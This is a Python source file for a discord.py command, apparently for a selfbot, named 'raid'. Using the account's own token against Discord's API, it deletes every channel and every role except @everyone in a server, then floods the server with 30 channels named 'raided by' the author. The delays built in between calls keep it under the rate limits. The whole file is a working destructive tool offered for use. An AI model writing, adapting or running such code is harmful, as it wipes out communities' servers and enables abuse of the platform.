# Utilisation:
# <p>raid

import discord
from discord.ext import commands
import asyncio
import aiohttp

class RaidCommand(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def raid(self, ctx):
        guild = ctx.guild
        if not guild:
            await ctx.message.edit(content="❌ Impossible d'obtenir l'id du serv ❌")
            await asyncio.sleep(2)
            await ctx.message.delete()
            return

        await ctx.message.edit(content="🪐 intrusif raid 🪐")
        await asyncio.sleep(2)
        await ctx.message.delete()

        headers = {"Authorization": f"{self.bot.http.token}"}

        async with aiohttp.ClientSession() as session:
            try:
                for channel in guild.channels:
                    durl = f"https://discord.com/api/v9/channels/{channel.id}"
                    async with session.delete(durl, headers=headers) as dresponse:
                        if dresponse.status in [200, 204]:
                            print(f"✅ Channel '{channel.name}' supprimé")
                        else:
                            print(f"❌ Impossible de supprimer le salon '{channel.name}':\n{dresponse.status}")
                    await asyncio.sleep(0.64)

            except Exception as e:
                print(f"❌ Erreur:\n{e}")

            try:
                rurl = f"https://discord.com/api/v9/guilds/{guild.id}/roles"
                async with session.get(rurl, headers=headers) as r:
                    if r.status != 200:
                        print(f"❌ Erreur:\n{r.status}")
                        return
                    roles = await r.json()

                for role in roles:
                    if role["name"] == "@everyone":
                        continue
                    durl = f"{rurl}/{role['id']}"
                    async with session.delete(durl, headers=headers) as dresponse:
                        if dresponse.status in [200, 204]:
                            print(f"✅ Rôle '{role['name']}' supprimé")
                        else:
                            print(f"❌ Impossible de supprimer le rôle '{role['name']}':\n{dresponse.status}")
                    await asyncio.sleep(0.64)

            except Exception as e:
                print(f"❌ Erreur: {e}")

            try:
                for i in range(30):
                    cdata = {"name": f"raided by {ctx.author.name}", "type": 0}
                    curl = f"https://discord.com/api/v9/guilds/{guild.id}/channels"
                    async with session.post(curl, headers=headers, json=cdata) as cresponse:
                        if cresponse.status == 201:
                            print(f"✅ Channel ({i + 1}/30) 'raided by {ctx.author.name}' créé")
                        else:
                            print(f"❌ Impossible de créer un salon:\n{cresponse.status}")
                    await asyncio.sleep(0.65)

            except Exception as e:
                print(f"❌ Erreur:\n{e}")

        print("✅ Raid terminé")

def setup(bot):
    bot.add_cog(RaidCommand(bot))
